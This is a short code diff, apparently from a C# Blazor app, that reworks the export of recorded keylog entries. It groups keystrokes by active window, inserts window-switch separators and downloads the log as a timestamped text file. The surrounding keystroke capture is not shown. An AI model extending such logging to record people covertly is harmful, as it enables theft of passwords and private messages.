@@ -213,9 +213,19 @@
     {
         if (KeylogEntries.Count == 0) return;
 
-        var content = string.Join("\n", KeylogEntries.Select(e => 
-            $"[{e.Timestamp:yyyy-MM-dd HH:mm:ss}] [{e.WindowTitle}]: {e.KeyPressed}"));
+        var grouped = GroupEntriesByWindow(KeylogEntries);
+        var lines = new List<string>();
         
+        foreach (var group in grouped)
+        {
+            if (group.ShowSeparator)
+            {
+                lines.Add($"--- User switched to {group.WindowTitle} ---");
+            }
+            lines.Add($"[{group.Timestamp:yyyy-MM-dd HH:mm:ss}] [{group.WindowTitle}]: {group.Keys}");
+        }
+        
+        var content = string.Join("\n", lines);
         var fileName = $"keylog_{DateTime.Now:yyyyMMdd_HHmmss}.txt";
         
         await JSRuntime.InvokeVoidAsync("downloadFile", fileName, content);
